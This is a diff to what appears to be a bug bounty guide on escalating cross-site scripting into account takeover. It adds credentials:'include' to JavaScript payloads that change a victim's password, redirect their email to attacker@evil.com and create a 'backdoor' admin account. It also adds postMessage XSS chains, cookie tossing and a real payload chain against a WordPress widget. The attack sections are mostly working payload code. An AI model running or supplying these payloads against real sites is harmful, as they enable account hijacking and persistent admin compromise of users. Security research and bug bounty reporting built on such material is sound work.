@@ -15,6 +15,8 @@ From lowest to highest severity:
 
 Your goal: climb this ladder.
 
+---
+
 ## Escalation Paths
 
 ### Self-XSS → Real Impact
@@ -62,6 +64,7 @@ Why steal session when you can change password?
 fetch("/api/user/password",{
   method:"POST",
   headers:{"Content-Type":"application/json"},
+  credentials:"include",
   body:JSON.stringify({new_password:"hacked123"})
 });
 
@@ -69,6 +72,7 @@ fetch("/api/user/password",{
 fetch("/api/user/email",{
   method:"POST", 
   headers:{"Content-Type":"application/json"},
+  credentials:"include",
   body:JSON.stringify({email:"attacker@evil.com"})
 });
 ```
@@ -82,6 +86,7 @@ If stored XSS affects admin:
 fetch("/admin/users",{
   method:"POST",
   headers:{"Content-Type":"application/json"},
+  credentials:"include",
   body:JSON.stringify({
     username:"backdoor",
     password:"hacked123",
@@ -137,6 +142,58 @@ if(typeof ethereum !== 'undefined'){
 }
 ```
 
+---
+
+## PostMessage XSS Chains
+
+### Stored DOM XSS
+
+```javascript
+// Store payload in localStorage
+localStorage.setItem('prefs', '<img src=x onerror=alert(1)>');
+
+// Later execution when page loads:
+document.body.innerHTML = localStorage.getItem('prefs');
+```
+
+### PostMessage to Parent
+
+```javascript
+// XSS on widgets.example.com
+// Send malicious postMessage to parent
+parent.postMessage({
+  type: 'inject',
+  html: '<img src=x onerror=alert(document.domain)>'
+}, '*');
+```
+
+### Cookie Tossing (Self-XSS Upgrade)
+
+```javascript
+// Set cookie on subdomain affecting main domain
+document.cookie = 'xss=<script>alert(1)</script>;domain=.example.com;path=/';
+```
+
+---
+
+## Real Example: PostMessage Chain
+
+**Jetpack PostMessage XSS (Report #2371019):**
+
+```javascript
+// Stage 1: XSS on widgets.wp.com
+https://widgets.wp.com/sharing-buttons-preview/?custom[0][name]="><img src onerror=alert()>
+
+// Stage 2: PostMessage to parent
+const payload = {
+  type: 'showOtherGravatars',
+  likers: [{avatar_URL: 'javascript:alert(document.domain)'}]
+};
+parent.postMessage(payload, '*');
+```
+
+---
+
 ## Demonstrating Impact
 
 ### For Bug Bounty Reports
@@ -155,6 +212,8 @@ Don't just say "XSS can steal cookies." Show it:
 | ATO via email change | "Attacker can take over any user account permanently" |
 | Admin compromise | "Attacker can escalate to admin, affecting all users" |
 | Data exfil | "Attacker can extract sensitive data (PII, financial)" |
+
+---
 
 ## PoC Best Practices
 
